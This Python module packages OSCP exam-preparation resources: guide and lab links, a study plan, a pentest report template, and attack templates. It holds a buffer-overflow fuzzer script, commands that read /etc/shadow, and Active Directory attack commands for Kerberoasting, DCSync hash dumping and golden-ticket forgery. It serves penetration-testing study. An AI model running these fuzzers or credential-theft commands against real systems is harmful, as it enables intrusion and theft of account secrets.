#!/usr/bin/env python3
"""
OSCP Resources Module - Integrates OSCP-specific tools and methodologies
Based on the awesome-oscp curated list
"""

import json
import os
import requests
from typing import Dict, List, Any, Optional
import subprocess
import platform
from pathlib import Path

class OSCPResources:
    """OSCP-specific resources, methodologies, and automation"""
    
    def __init__(self):
        self.platform = platform.system().lower()
        self.is_windows = self.platform == 'windows'
        self.is_linux = self.platform == 'linux'
        
        # OSCP Methodology phases
        self.methodology_phases = {
            1: "Information Gathering",
            2: "Scanning & Enumeration", 
            3: "Vulnerability Assessment",
            4: "Exploitation",
            5: "Post-Exploitation",
            6: "Privilege Escalation",
            7: "Documentation & Reporting"
        }
        
        # Initialize OSCP resources
        self._init_oscp_resources()
        self._init_buffer_overflow_templates()
        self._init_privilege_escalation_checks()
        self._init_active_directory_attacks()
        
    def _init_oscp_resources(self):
        """Initialize OSCP study resources and guides"""
        self.oscp_guides = {
            "preparation": [
                {
                    "title": "Luke's Ultimate OSCP Guide",
                    "url": "https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-1-is-oscp-for-you-b57cbcce7440",
                    "type": "guide",
                    "difficulty": "beginner"
                },
                {
                    "title": "TJnull's Preparation Guide for OSCP 2.0",
                    "url": "https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html",
                    "type": "guide", 
                    "difficulty": "intermediate"
                },
                {
                    "title": "n3ko1's OSCP Guide",
                    "url": "https://n3ko1.github.io/oscp/2019/06/26/oscp-guide.html",
                    "type": "guide",
                    "difficulty": "intermediate"
                }
            ],
            "practice_labs": [
                {
                    "name": "HackTheBox",
                    "url": "https://hackthebox.eu",
                    "type": "lab",
                    "cost": "paid",
                    "oscp_boxes": ["Forest", "Active", "Fuse", "Cascade", "Monteverde"]
                },
                {
                    "name": "TryHackMe", 
                    "url": "https://tryhackme.com",
                    "type": "lab",
                    "cost": "freemium",
                    "oscp_rooms": ["Active Directory Basics", "Attacktive Directory", "Vulnnet Roasted"]
                },
                {
                    "name": "Proving Grounds",
                    "url": "https://portal.offensive-security.com/proving-grounds/practice",
                    "type": "lab",
                    "cost": "paid",
                    "official": True
                }
            ],
            "cheatsheets": [
                {
                    "name": "Reverse Shell Cheat Sheet",
                    "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md",
                    "category": "shells"
                },
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/",
                    "category": "privilege_escalation"
                },
                {
                    "name": "LOLBAS",
                    "url": "https://lolbas-project.github.io/",
                    "category": "windows_binaries"
                }
            ]
        }
        
    def _init_buffer_overflow_templates(self):
        """Initialize buffer overflow templates and payloads"""
        self.buffer_overflow = {
            "methodology": [
                "1. Fuzzing - Find the crash point",
                "2. Offset Discovery - Control EIP",
                "3. Bad Character Analysis", 
                "4. JMP ESP Discovery",
                "5. Shellcode Generation",
                "6. Final Exploit"
            ],
            "templates": {
                "fuzzer": """
import socket
import time

ip = "TARGET_IP"
port = TARGET_PORT

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        
        s.send(("USER " + buffer + "\\r\\n").encode())
        s.recv(1024)
        s.send(("PASS " + buffer + "\\r\\n").encode())
        s.close()
        
        print(f"Fuzzing with {len(buffer)} bytes")
        buffer = buffer + "A" * 100
        time.sleep(1)
        
    except:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        break
                """,
                "offset_finder": """
# Generate unique pattern
msf-pattern_create -l LENGTH

# Find offset in crashed program
msf-pattern_offset -l LENGTH -q EIP_VALUE

# Verify offset
buffer = "A" * OFFSET + "B" * 4 + "C" * (LENGTH - OFFSET - 4)
                """,
                "bad_chars": """
# Bad character discovery
badchars = (
    "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"
    "\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"
    "\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30"
    "\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"
    "\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50"
    "\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60"
    "\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70"
    "\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80"
    "\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90"
    "\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0"
    "\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0"
    "\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0"
    "\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0"
    "\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0"
    "\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0"
    "\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"
)
                """
            },
            "tools": {
                "immunity_debugger": "Windows debugger for BOF analysis",
                "gdb": "Linux debugger with PEDA/GEF extensions",
                "mona": "Immunity Debugger plugin for exploit development",
                "pattern_create": "Metasploit pattern generation tool",
                "pattern_offset": "Metasploit offset calculation tool"
            }
        }
    
    def _init_privilege_escalation_checks(self):
        """Initialize privilege escalation enumeration scripts"""
        self.privesc = {
            "linux": {
                "scripts": [
                    {
                        "name": "LinPEAS",
                        "url": "https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS",
                        "description": "Linux Privilege Escalation Awesome Script"
                    },
                    {
                        "name": "LinEnum", 
                        "url": "https://github.com/rebootuser/LinEnum",
                        "description": "Scripted Local Linux Enumeration & Privilege Escalation"
                    },
                    {
                        "name": "Linux Exploit Suggester",
                        "url": "https://github.com/mzet-/linux-exploit-suggester",
                        "description": "Linux privilege escalation auditing tool"
                    }
                ],
                "manual_checks": [
                    "sudo -l",
                    "find / -perm -u=s -type f 2>/dev/null",
                    "find / -perm -g=s -type f 2>/dev/null", 
                    "cat /etc/passwd",
                    "cat /etc/shadow",
                    "cat /etc/group",
                    "crontab -l",
                    "cat /etc/crontab",
                    "ps aux",
                    "netstat -antup",
                    "ss -antp"
                ]
            },
            "windows": {
                "scripts": [
                    {
                        "name": "WinPEAS",
                        "url": "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS",
                        "description": "Windows Privilege Escalation Awesome Scripts"
                    },
                    {
                        "name": "PowerUp",
                        "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",
                        "description": "PowerShell tool to assist with local privilege escalation"
                    },
                    {
                        "name": "Windows Exploit Suggester",
                        "url": "https://github.com/AonCyberLabs/Windows-Exploit-Suggester",
                        "description": "Compares target patch levels against Microsoft vulnerability database"
                    }
                ],
                "manual_checks": [
                    "whoami",
                    "whoami /priv",
                    "whoami /groups",
                    "net user",
                    "net localgroup administrators",
                    "systeminfo",
                    "wmic qfe get Caption,Description,HotFixID,InstalledOn",
                    "netstat -ano",
                    "tasklist /svc",
                    "sc query",
                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated",
                    "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated"
                ]
            }
        }
    
    def _init_active_directory_attacks(self):
        """Initialize Active Directory attack methodologies"""
        self.ad_attacks = {
            "enumeration": [
                {
                    "tool": "enum4linux",
                    "command": "enum4linux -a {target}",
                    "description": "SMB enumeration tool"
                },
                {
                    "tool": "smbclient", 
                    "command": "smbclient -L //{target}",
                    "description": "List SMB shares"
                },
                {
                    "tool": "rpcclient",
                    "command": "rpcclient -U \"\" {target}",
                    "description": "RPC enumeration"
                },
                {
                    "tool": "ldapsearch",
                    "command": "ldapsearch -x -h {target} -s base namingcontexts",
                    "description": "LDAP enumeration"
                }
            ],
            "attacks": [
                {
                    "name": "ASREPRoasting",
                    "tool": "impacket-GetNPUsers",
                    "command": "impacket-GetNPUsers {domain}/ -usersfile users.txt -format hashcat -outputfile hashes.txt",
                    "description": "Attack users with 'Do not require Kerberos preauthentication' set"
                },
                {
                    "name": "Kerberoasting",
                    "tool": "impacket-GetUserSPNs", 
                    "command": "impacket-GetUserSPNs {domain}/{user}:{password} -dc-ip {dc_ip} -request",
                    "description": "Request TGS tickets for service accounts"
                },
                {
                    "name": "DCSync",
                    "tool": "impacket-secretsdump",
                    "command": "impacket-secretsdump {domain}/{user}:{password}@{target}",
                    "description": "Extract password hashes from DC"
                },
                {
                    "name": "Golden Ticket",
                    "tool": "impacket-ticketer",
                    "command": "impacket-ticketer -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user}",
                    "description": "Create golden ticket for persistence"
                }
            ],
            "tools": [
                "impacket",
                "bloodhound", 
                "crackmapexec",
                "powerview",
                "rubeus",
                "mimikatz"
            ]
        }
    
    def get_oscp_methodology(self) -> Dict[str, Any]:
        """Get the complete OSCP methodology framework"""
        return {
            "phases": self.methodology_phases,
            "current_phase": 1,
            "checklist": self._generate_methodology_checklist()
        }
    
    def _generate_methodology_checklist(self) -> Dict[int, List[str]]:
        """Generate detailed checklist for each methodology phase"""
        return {
            1: [  # Information Gathering
                "□ Identify target IP range",
                "□ Passive reconnaissance (Google dorking, social media)",
                "□ DNS enumeration (nslookup, dig, dnsrecon)",
                "□ WHOIS lookup",
                "□ Subdomain enumeration (sublist3r, gobuster)",
                "□ Email harvesting (theHarvester)",
                "□ Technology stack identification (Wappalyzer, whatweb)"
            ],
            2: [  # Scanning & Enumeration
                "□ Network discovery (nmap ping sweep)",
                "□ Port scanning (TCP/UDP)",
                "□ Service enumeration",
                "□ OS fingerprinting", 
                "□ Banner grabbing",
                "□ SMB enumeration (enum4linux, smbclient)",
                "□ SNMP enumeration (snmpwalk)",
                "□ Web application discovery"
            ],
            3: [  # Vulnerability Assessment
                "□ Vulnerability scanning (nessus, openvas)",
                "□ Manual testing",
                "□ Exploit research (searchsploit, exploit-db)",
                "□ Version-specific vulnerabilities",
                "□ Configuration issues",
                "□ Web application vulnerabilities (nikto, gobuster)"
            ],
            4: [  # Exploitation
                "□ Exploit selection and customization",
                "□ Payload generation (msfvenom)",
                "□ Initial foothold attempt",
                "□ Shell stabilization",
                "□ Document successful exploitation",
                "□ Screenshot proof of concept"
            ],
            5: [  # Post-Exploitation
                "□ System enumeration",
                "□ User enumeration", 
                "□ Network enumeration from inside",
                "□ Data exfiltration (if authorized)",
                "□ Persistence mechanisms",
                "□ Lateral movement opportunities"
            ],
            6: [  # Privilege Escalation
                "□ Local enumeration (LinPEAS/WinPEAS)",
                "□ Kernel exploits",
                "□ SUID/SGID binaries (Linux)",
                "□ Service vulnerabilities",
                "□ Scheduled tasks/cron jobs",
                "□ Credential harvesting",
                "□ Token impersonation (Windows)"
            ],
            7: [  # Documentation & Reporting
                "□ Executive summary",
                "□ Technical findings",
                "□ Risk ratings",
                "□ Remediation recommendations", 
                "□ Proof of concept scripts",
                "□ Screenshots and evidence",
                "□ Appendices (tools used, references)"
            ]
        }
    
    def get_buffer_overflow_guide(self, step: Optional[str] = None) -> Dict[str, Any]:
        """Get buffer overflow methodology and templates"""
        if step:
            return {
                "step": step,
                "template": self.buffer_overflow["templates"].get(step, "Step not found"),
                "description": self.buffer_overflow["methodology"]
            }
        return self.buffer_overflow
    
    def get_privilege_escalation_checks(self, os_type: str = "linux") -> Dict[str, Any]:
        """Get privilege escalation enumeration for specified OS"""
        return self.privesc.get(os_type, self.privesc["linux"])
    
    def get_active_directory_attacks(self) -> Dict[str, Any]:
        """Get Active Directory attack methodologies"""
        return self.ad_attacks
    
    def generate_oscp_report_template(self, target_info: Dict[str, Any]) -> str:
        """Generate OSCP-style penetration test report template"""
        template = f"""
# Penetration Test Report

**Target**: {target_info.get('target', 'N/A')}
**Date**: {target_info.get('date', 'N/A')}
**Tester**: {target_info.get('tester', 'N/A')}

## Executive Summary

[Brief overview of the assessment]

## Methodology

The testing methodology followed the OSCP guidelines:

1. **Information Gathering**
2. **Scanning & Enumeration** 
3. **Vulnerability Assessment**
4. **Exploitation**
5. **Post-Exploitation**
6. **Privilege Escalation**
7. **Documentation & Reporting**

## Technical Findings

### High Risk Vulnerabilities
[List critical findings]

### Medium Risk Vulnerabilities  
[List medium findings]

### Low Risk Vulnerabilities
[List low findings]

### Informational
[List informational findings]

## Detailed Vulnerability Information

### [Vulnerability Name]
- **Risk**: High/Medium/Low
- **CVSS Score**: X.X
- **Description**: [Detailed description]
- **Impact**: [Business impact]
- **Proof of Concept**: [Steps to reproduce]
- **Remediation**: [How to fix]

## Recommendations

1. [Priority recommendations]
2. [Security best practices]
3. [Long-term security improvements]

## Conclusion

[Final thoughts and summary]

## Appendices

### Appendix A: Tools Used
- Nmap
- Metasploit
- Burp Suite
- [Additional tools]

### Appendix B: References
- OSCP Methodology
- CVE Database
- [Additional references]
        """
        return template.strip()
    
    def get_oscp_practice_boxes(self, platform: str = "all") -> List[Dict[str, Any]]:
        """Get recommended OSCP practice boxes"""
        boxes = []
        
        if platform in ["all", "hackthebox"]:
            htb_boxes = [
                {"name": "Forest", "difficulty": "Easy", "focus": "Active Directory"},
                {"name": "Active", "difficulty": "Easy", "focus": "Active Directory"},
                {"name": "Fuse", "difficulty": "Medium", "focus": "Windows/AD"},
                {"name": "Cascade", "difficulty": "Medium", "focus": "Windows/AD"},
                {"name": "Monteverde", "difficulty": "Medium", "focus": "Windows/AD"},
                {"name": "Resolute", "difficulty": "Medium", "focus": "Windows/AD"},
                {"name": "Sauna", "difficulty": "Easy", "focus": "Windows/Kerberoasting"},
                {"name": "Bastard", "difficulty": "Medium", "focus": "Windows/Drupal"},
                {"name": "Granny", "difficulty": "Easy", "focus": "Windows/WebDAV"},
                {"name": "Grandpa", "difficulty": "Easy", "focus": "Windows/IIS"},
            ]
            boxes.extend(htb_boxes)
        
        if platform in ["all", "tryhackme"]:
            thm_rooms = [
                {"name": "Active Directory Basics", "difficulty": "Easy", "focus": "AD Fundamentals"},
                {"name": "Attacktive Directory", "difficulty": "Medium", "focus": "AD Attacks"},
                {"name": "Vulnnet: Roasted", "difficulty": "Easy", "focus": "Kerberoasting"},
                {"name": "Post-Exploitation Basics", "difficulty": "Easy", "focus": "Post-Exploitation"},
                {"name": "Steel Mountain", "difficulty": "Easy", "focus": "Windows/Metasploit"},
                {"name": "Blue", "difficulty": "Easy", "focus": "Windows/EternalBlue"},
            ]
            boxes.extend(thm_rooms)
        
        return boxes
    
    def generate_study_plan(self, weeks: int = 12) -> Dict[str, Any]:
        """Generate a structured OSCP study plan"""
        if weeks < 4:
            weeks = 4
        elif weeks > 24:
            weeks = 24
            
        weeks_per_phase = max(1, weeks // 6)
        
        study_plan = {
            "total_weeks": weeks,
            "phases": {
                f"Weeks 1-{weeks_per_phase}": {
                    "focus": "Information Gathering & Reconnaissance",
                    "activities": [
                        "Learn passive information gathering techniques",
                        "Practice with Google dorking and OSINT tools",
                        "Master DNS enumeration tools",
                        "Study network discovery methodologies"
                    ],
                    "tools": ["nmap", "dig", "whois", "theHarvester", "sublist3r"],
                    "practice": ["TryHackMe OSINT rooms", "Google Dorking exercises"]
                },
                f"Weeks {weeks_per_phase+1}-{weeks_per_phase*2}": {
                    "focus": "Scanning & Enumeration",
                    "activities": [
                        "Master Nmap scanning techniques",
                        "Learn service enumeration",
                        "Practice SMB/RPC enumeration",
                        "Web application discovery"
                    ],
                    "tools": ["nmap", "gobuster", "enum4linux", "smbclient"],
                    "practice": ["HackTheBox easy machines", "Nmap scripting"]
                },
                f"Weeks {weeks_per_phase*2+1}-{weeks_per_phase*3}": {
                    "focus": "Web Application Security",
                    "activities": [
                        "OWASP Top 10 vulnerabilities",
                        "Manual web application testing", 
                        "SQL injection techniques",
                        "Cross-Site Scripting (XSS)"
                    ],
                    "tools": ["Burp Suite", "sqlmap", "nikto", "dirb"],
                    "practice": ["WebGoat", "DVWA", "bWAPP"]
                },
                f"Weeks {weeks_per_phase*3+1}-{weeks_per_phase*4}": {
                    "focus": "Buffer Overflows",
                    "activities": [
                        "Stack-based buffer overflow methodology",
                        "Exploit development process",
                        "Shellcode generation and encoding",
                        "Practice with vulnerable applications"
                    ],
                    "tools": ["Immunity Debugger", "mona", "msfvenom"],
                    "practice": ["Vulnserver", "Buffer Overflow Prep (TryHackMe)"]
                },
                f"Weeks {weeks_per_phase*4+1}-{weeks_per_phase*5}": {
                    "focus": "Privilege Escalation",
                    "activities": [
                        "Linux privilege escalation techniques",
                        "Windows privilege escalation techniques", 
                        "Automated enumeration scripts",
                        "Manual enumeration skills"
                    ],
                    "tools": ["LinPEAS", "WinPEAS", "PowerUp", "linux-exploit-suggester"],
                    "practice": ["HackTheBox medium machines", "TryHackMe privesc rooms"]
                },
                f"Weeks {weeks_per_phase*5+1}-{weeks}": {
                    "focus": "Active Directory & Final Preparation",
                    "activities": [
                        "Active Directory attack techniques",
                        "Kerberoasting and ASREPRoasting",
                        "Lateral movement techniques",
                        "Full machine walkthroughs"
                    ],
                    "tools": ["BloodHound", "Rubeus", "Mimikatz", "CrackMapExec"],
                    "practice": ["AD lab setup", "Full OSCP-like boxes"]
                }
            },
            "daily_schedule": {
                "weekday": "2-3 hours study + 1 hour practice",
                "weekend": "4-6 hours mixed study and practice"
            },
            "milestones": {
                f"Week {weeks//4}": "Complete 5 easy machines",
                f"Week {weeks//2}": "Complete 10 machines (5 easy, 3 medium, 2 hard)",
                f"Week {weeks*3//4}": "Complete full Active Directory chain",
                f"Week {weeks-1}": "Take practice exam"
            }
        }
        
        return study_plan
